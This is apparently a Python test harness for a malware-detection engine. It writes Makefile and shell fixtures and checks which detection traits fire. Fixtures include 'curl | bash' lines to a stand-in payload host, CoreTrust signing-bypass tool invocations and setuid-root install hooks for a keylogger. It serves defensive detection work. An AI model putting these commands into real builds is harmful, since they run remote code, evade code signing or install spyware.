#!/usr/bin/env python3
"""Check Makefile exploit/install detection and benign supporting-file controls."""

import argparse
import json
from pathlib import Path
import subprocess
import tempfile


CORE = "objectives/evasion/security-bypass/codesign::coretrust-exploit-build"
CT_COMMAND = "objectives/evasion/security-bypass/codesign::coretrust-exploit-command"
LOGKEYS = "well-known/malware/keylogger/logkeys::logkeys-privileged-helper-install"
PIPE = "micro-behaviors/process/create/shell/pipeline::makefile-curl-pipe-shell"
MODELS = "micro-behaviors/data/llm/wire-marker::"
FAILOVER = "micro-behaviors/data/llm/agent::llm-refusal-triggered-model-failover"
BAD = {"3ea573bff8ba": LOGKEYS, "fd000f56a72a": CORE}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="../cleave/target/release/cleave")
    inputs = parser.add_mutually_exclusive_group()
    inputs.add_argument("--samples", type=Path)
    inputs.add_argument("--manifest", type=Path, help="Review JSON with relocated sample paths")
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[2]
    engine = str((repo / args.cleave).resolve())
    # Required, forbidden and expected minimum severity are independent of
    # filename. These controls never execute Make, compilers or exploit tools.
    fixtures = {
        "coretrust.mk": ("CC=clang\nSIGN=ldid\nall:\n\t$(CC) main.m -o app\n\tct_bypass -i app -o app -r\n", {CORE}, set(), 5),
        "coretrust-path.mk": ("CC=clang\nCODESIGN=ldid\nall:\n\t@ ${CC} main.m -o app\n\t+@ ./ct_bypass -r -i app\n", {CORE}, set(), 5),
        "coretrust-no-config.mk": ("apply:\n\tct_bypass -i ./app -o ./signed-app\n", {CORE}, set(), 5),
        "coretrust-sudo.mk": ("apply:\n\t@sudo /usr/local/bin/ct_bypass -r -i ./app\n", {CORE}, set(), 5),
        "coretrust-option-order.mk": ("apply:\n\tct_bypass -o ./signed-app -i ./app\n", {CORE}, set(), 5),
        "coretrust-app-bundle.mk": ("apply:\n\tct_bypass -i ./Example.app -a\n", {CORE}, set(), 5),
        "coretrust-quoted-flags.mk": ('apply:\n\tct_bypass "-i" ./app "-r"\n', {CORE}, set(), 5),
        "coretrust-quoted-input.mk": ('apply:\n\tct_bypass -i "file -r copy.app"\n', set(), {CORE}, 0),
        "coretrust-quoted-output.mk": ('apply:\n\tct_bypass -i "input app" -o "signed app"\n', {CORE}, set(), 5),
        "coretrust-quoted-example.mk": ('apply:\n\tct_bypass "example -i app -r"\n', set(), {CORE}, 0),
        "coretrust-sudo-n.mk": ("apply:\n\tsudo -n ct_bypass -i ./app -r\n", {CORE}, set(), 5),
        "coretrust-probe.mk": ("probe:\n\tct_bypass --help\n\t@echo 'ct_bypass -i app -o signed-app -r'\n", set(), {CORE}, 0),
        "coretrust-incomplete.mk": ("apply:\n\tct_bypass -i ./app\n", set(), {CORE}, 0),
        "coretrust-call.sh": ("#!/bin/sh\nct_bypass -i ./app -r\n", {"objectives/evasion/security-bypass/codesign::coretrust-exploit-shell-call"}, set(), 5),
        "coretrust-conditional.sh": ("#!/bin/sh\nif true; then ct_bypass -i ./Example.app -a; fi\n", {"objectives/evasion/security-bypass/codesign::coretrust-exploit-shell-call"}, set(), 5),
        "coretrust-sudo.sh": ("#!/bin/sh\nsudo /usr/local/bin/ct_bypass -i ./app -o ./signed\n", {"objectives/evasion/security-bypass/codesign::coretrust-exploit-sudo-call"}, set(), 5),
        "coretrust-sudo-n.sh": ("#!/bin/sh\nsudo -n /usr/local/bin/ct_bypass -r -i ./app\n", {"objectives/evasion/security-bypass/codesign::coretrust-exploit-sudo-call"}, set(), 5),
        "coretrust-sudo-n-echo.sh": ("#!/bin/sh\nsudo -n echo ct_bypass -i ./app -r\n", set(), {"objectives/evasion/security-bypass/codesign::coretrust-exploit-sudo-call"}, 0),
        "coretrust-quoted-switches.sh": ('#!/bin/sh\nct_bypass "-i" ./app "-r"\n', {"objectives/evasion/security-bypass/codesign::coretrust-exploit-shell-call"}, set(), 5),
        "coretrust-quoted-input.sh": ('#!/bin/sh\nct_bypass -i "file -r copy.app"\n', set(), {"objectives/evasion/security-bypass/codesign::coretrust-exploit-shell-call"}, 0),
        "coretrust-sudo-echo.sh": ("#!/bin/sh\nsudo echo ct_bypass -i ./app -r\n", set(), {"objectives/evasion/security-bypass/codesign::coretrust-exploit-sudo-call"}, 0),
        "normal-sign.mk": ("CC=clang\nSIGN=ldid\nall:\n\t$(CC) main.m -o app\n\tldid -S app\n", set(), {CORE, CT_COMMAND}, 0),
        "commented-ct.mk": ("SIGN=ldid\nall:\n\t# ct_bypass -i app -o app -r\n\t@echo 'ct_bypass -i app -o app -r'\n", set(), {CORE, CT_COMMAND}, 0),
        "setuid.mk": ("all:\n\tchown root:root helper\n\tchmod 4755 helper\n", set(), {LOGKEYS}, 0),
        "keylogger-build.mk": ("logkeys_SOURCES = logkeys.cc\ninstall-exec-hook:\n\tchown root\\: $(DESTDIR)/llk\n\tchmod u+s $(DESTDIR)/llk\n", {LOGKEYS}, set(), 5),
        "keylogger-numeric.mk": ("logkeys_SOURCES = logkeys.cc\ninstall-exec-hook:\n\t@chown 0:0 ./llk\n\t@chmod 04755 ./llk\n", {LOGKEYS}, set(), 5),
        "keylogger-llkk.mk": ("logkeys_SOURCES = logkeys.cc\ninstall-exec-hook:\n\tchown root: ./llkk\n\tchmod u+s ./llkk\n", {LOGKEYS}, set(), 5),
        "keylogger-one-line.mk": ("logkeys_SOURCES=logkeys.cc\ninstall:\n\tchown root: ./llk && chmod u+s ./llk\n", {LOGKEYS}, set(), 5),
        "keylogger-one-line-llkk.mk": ("logkeys_SOURCES=logkeys.cc\ninstall:\n\tchown 0:0 ./llkk; chmod 4755 ./llkk\n", {LOGKEYS}, set(), 5),
        "keylogger-one-line-mixed.mk": ("logkeys_SOURCES=logkeys.cc\ninstall:\n\tchown root: ./llk && chmod u+s ./llkk\n", set(), {LOGKEYS}, 0),
        "keylogger-one-line-reverse.mk": ("logkeys_SOURCES=logkeys.cc\ninstall:\n\tchmod u+s ./llk && chown root: ./llk\n", set(), {LOGKEYS}, 0),
        "keylogger-unrelated.mk": ("logkeys_SOURCES = logkeys.cc\ninstall:\n\tchown root: ./unrelated\n\tchmod u+s ./different\n", set(), {LOGKEYS}, 0),
        "keylogger-mixed-helpers.mk": ("logkeys_SOURCES = logkeys.cc\ninstall:\n\tchown root: ./llk\n\tchmod u+s ./llkk\n", set(), {LOGKEYS}, 0),
        "keylogger-split.mk": ("logkeys_SOURCES = logkeys.cc\ninstall:\n\tchown root: ./llk\nother:\n\tchmod u+s ./llk\n", set(), {LOGKEYS}, 0),
        "keylogger-reverse.mk": ("logkeys_SOURCES = logkeys.cc\ninstall:\n\tchmod u+s ./llk\n\tchown root: ./llk\n", set(), {LOGKEYS}, 0),
        "keylogger-inert.mk": ("myconfdir=$(sysconfdir)\nmyconf_SCRIPTS = logkeys-start.sh logkeys-kill.sh\n", set(), {LOGKEYS}, 0),
        "keylogger-comment.mk": ("logkeys_SOURCES = logkeys.cc\nall:\n\t# chown root: helper\n\t# chmod u+s helper\n", set(), {LOGKEYS}, 0),
        "model-path.js": ('const repo="https://github.com/google/libphonenumber/"; const p="google/protobuf/field_mask.proto"; const other="google/protobuf";\n', set(), {FAILOVER}, 0),
        "refusal.js": ('const model="google/gemini-2.5-pro"; const path="/v1/chat/completions"; const prefix="I cannot";\n', {FAILOVER}, set(), 4),
        "generated-sign.mk": ('all:\n\techo "ldid -S /usr/bin/python" >> pkg/DEBIAN/postinst\n', {"micro-behaviors/crypto/sign::makefile-generated-postinst-ldid-signing"}, set(), 0),
        "sign-example.mk": ('all:\n\techo "ldid -S /usr/bin/python"\n', set(), {"micro-behaviors/crypto/sign::makefile-generated-postinst-ldid-signing"}, 0),
    }
    for prefix in ("", "@", "+", "-", "- ", " @+ "):
        name = f"pipeline-{len(fixtures)}.mk"
        fixtures[name] = (f"all:\n\t{prefix}curl -sL https://payload.invalid/run | bash\n", {PIPE}, set(), 4)
    fixtures["mixed-install.mk"] = (
        "all:\n\t@curl -sL https://git.io/goreleaser | bash\n\t+curl -sL https://payload.invalid/run | bash\n", {PIPE}, set(), 4)
    fixtures["lint-decoy.mk"] = (
        "LINT_URL=https://golangci-lint.run/install.sh\nall:\n\t-curl -sL https://payload.invalid/run | bash\n", {PIPE}, set(), 4)
    fixtures["goreleaser.mk"] = (
        "deploy:\n\t- curl -sL https://git.io/goreleaser | bash\n", set(), {PIPE}, 0)
    providers = {
        "anthropic": ("claude-3-5-sonnet", "anthropic"),
        "openai": ("gpt-4o", "openai"),
        "google": ("gemini-2.5-pro", "google"),
        "moonshotai": ("kimi-k2", "moonshot"),
        "deepseek": ("deepseek-chat", "deepseek"),
        "mistralai": ("mistral-large", "mistral"),
    }
    for provider, (model, trait) in providers.items():
        fixtures[f"{provider}.js"] = (f'const model="{provider}/{model}";\n', {MODELS + trait + "-namespaced-model-id"}, set(), 0)
    with tempfile.TemporaryDirectory(prefix="makefile-bad-controls-") as directory:
        work = Path(directory)
        for name, (content, _, _, _) in fixtures.items():
            (work / name).write_bytes(content.encode())
        samples = []
        if args.samples:
            samples = [(source, source.relative_to(args.samples).parts[0][:12])
                       for source in sorted(args.samples.rglob("*")) if source.is_file()]
        elif args.manifest:
            review = json.loads(args.manifest.read_text())
            samples = [(Path(item["current_path"]), item["sha256"][:12])
                       for item in review["samples"]]
        if samples:
            for source, key in samples:
                for basename in ("Makefile", "unrelated.mk"):
                    name = key + "/" + basename
                    dest = work / name
                    dest.parent.mkdir(parents=True, exist_ok=True)
                    dest.write_bytes(source.read_bytes())
                    required = {BAD[key]} if key in BAD else set()
                    if key == "1d134c86fc00":
                        required.add("micro-behaviors/os/container/runtime::docker-cli-run-create")
                    elif key == "2b4deb84d9e1":
                        required.add("micro-behaviors/crypto/sign::makefile-generated-postinst-ldid-signing")
                    fixtures[name] = (None, required, set(), 5 if key in BAD else 0)
        result = subprocess.run(
            [engine, "--traits-dir", str(repo), "--all-files", "--format", "json", str(work)],
            check=True, text=True, capture_output=True,
        )
        assert "skipped trait file" not in result.stderr, result.stderr
        files = {str(Path(f["path"]).relative_to(work)): f
                 for line in result.stdout.splitlines() if line.strip()
                 for f in json.loads(line)["files"]}
        assert len(files) == len(fixtures), (files.keys(), fixtures.keys())
        for name, (_, required, forbidden, severity) in fixtures.items():
            traits = files[name].get("traits", [])
            ids = {t["id"] for t in traits}
            assert required <= ids, (name, "missing", required - ids)
            assert not (forbidden & ids), (name, "unexpected", forbidden & ids)
            level = max((t["crit"] for t in traits), default=0)
            assert level >= severity, (name, level, severity)
            if not severity:
                assert level < 4, (name, "elevated", traits)
            if name == "model-path.js":
                assert not any(t.startswith(MODELS) and "namespaced-model-id" in t for t in ids), ids
        print(f"PASS: {len(files)} Makefiles/source controls, including renamed originals")


if __name__ == "__main__":
    main()
